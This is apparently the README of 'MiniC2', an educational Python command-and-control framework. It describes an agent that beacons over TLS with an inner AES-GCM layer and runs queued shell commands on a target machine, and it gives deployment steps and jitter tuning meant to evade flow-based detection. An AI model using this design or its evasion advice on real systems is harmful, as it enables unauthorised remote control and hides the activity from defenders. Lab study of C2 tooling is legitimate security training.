# MiniC2 — Educational Command-and-Control Framework

> **⚠️ Disclaimer:** This tool is built for educational and authorised lab use only.
> Run it exclusively inside an isolated VM network. Never deploy against systems
> you do not own or have explicit written permission to test.

---

## Overview

MiniC2 is a minimal, fully custom C2 framework written in Python. It was built
to demonstrate the mechanics of post-exploitation command-and-control
infrastructure at a level below off-the-shelf tools like Metasploit Meterpreter
— forcing engagement with the underlying concepts: encrypted beaconing, async
task queuing, and traffic obfuscation.

**What this is not:** a production-grade implant. The goal is learning, not
operational capability. The design is intentionally readable.

## Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                          ATTACKER MACHINE (Kali)                │
│                                                                 │
│   ┌─────────────────┐        ┌──────────────────────────────┐  │
│   │  operator.py    │──────▶ │         server.py            │  │
│   │  (CLI console)  │  HTTP  │  (Flask + TLS + SQLite)      │  │
│   └─────────────────┘        └──────────────┬───────────────┘  │
│                                             │                  │
└─────────────────────────────────────────────┼──────────────────┘
                                              │ HTTPS (port 4443)
                            AES-256-GCM encrypted payload
                                              │
┌─────────────────────────────────────────────┼──────────────────┐
│                      TARGET MACHINE         │                  │
│                                             ▼                  │
│                               ┌─────────────────────────┐     │
│                               │       agent.py          │     │
│                               │ (beacons every ~10s)    │     │
│                               └─────────────────────────┘     │
└─────────────────────────────────────────────────────────────────┘
```

### Communication flow

```
Agent                               Server
  │                                   │
  │──── POST /beacon ────────────────▶│  (encrypted metadata + agent ID)
  │◀─── {tasks: [...]} ───────────────│  (encrypted task list or empty)
  │                                   │
  │  [executes command in subprocess] │
  │                                   │
  │──── POST /result ────────────────▶│  (encrypted task_id + output)
  │◀─── {status: "ok"} ───────────────│
  │                                   │
  │  [sleep BEACON_INTERVAL ± jitter] │
  │                                   │
  └───────────── (repeat) ────────────┘
```

### Encryption

All agent↔server traffic is encrypted at two layers:

| Layer            | Mechanism            | Purpose                                    |
|------------------|----------------------|--------------------------------------------|
| Transport (outer)| TLS 1.2+ (HTTPS)     | Encrypts the HTTP session                  |
| Application (inner)| AES-256-GCM        | Encrypts the JSON payload inside HTTP      |

The inner AES layer means commands and results are opaque even under TLS
inspection or if TLS is stripped by a proxy — a common defensive control.
AES-GCM also provides **authenticated encryption**: the GCM tag proves the
ciphertext hasn't been modified in transit.

## Setup & Usage

### Prerequisites

- Kali Linux (server + operator)
- A target VM on the same NAT subnet (Metasploitable2, Ubuntu, or Windows)
- Python 3.10+ on both machines
- `openssl` (pre-installed on Kali)

---

### 1 — Generate the TLS certificate (Kali)

```bash
cd mini-c2/
chmod +x scripts/gen_cert.sh
./scripts/gen_cert.sh
```

This creates `server/cert.pem` and `server/key.pem`.

---

### 2 — Install server dependencies (Kali)

```bash
cd mini-c2/server/
pip install -r requirements.txt
```

---

### 3 — Start the C2 server (Kali)

```bash
python server.py
# [*] MiniC2 server starting on https://0.0.0.0:4443
```

---

### 4 — Configure and deploy the agent (target VM)

Edit `agent/agent.py` and set `C2_HOST` to your Kali IP:

```python
C2_HOST = "https://192.168.x.x:4443"   # ← your Kali IP here
```

Copy the `agent/` directory to the target VM, install dependencies, and run:

```bash
pip install -r requirements.txt
python agent.py
```

---

### 5 — Open the operator console (Kali, new terminal)

```bash
cd mini-c2/server/
python operator.py
```

## Operator Console Commands

| Command                  | Description                                        |
|--------------------------|----------------------------------------------------|
| `agents`                 | List all registered agents                         |
| `use <agent_id>`         | Open interactive pseudo-shell for an agent         |
| `task <agent_id> <cmd>`  | Queue a single command (non-interactive)           |
| `results <agent_id>`     | View all task results for an agent                 |
| `help`                   | Show help                                          |
| `exit`                   | Quit                                               |

**Inside the pseudo-shell (`use <id>`):**

| Command    | Description                                  |
|------------|----------------------------------------------|
| `<any>`    | Queue it as a shell command for the agent     |
| `results`  | Pull latest output for this agent             |
| `exit`     | Return to main console                        |

## Customising Beacon Behaviour

In `agent/agent.py`:

```python
BEACON_INTERVAL = 10    # seconds between check-ins
JITTER          = 3     # ± random seconds added (prevents regular timing)
TASK_TIMEOUT    = 30    # max seconds per executed command
```

Increasing `JITTER` relative to `BEACON_INTERVAL` makes the beacon timing
harder to distinguish from organic user traffic in flow-based detection.
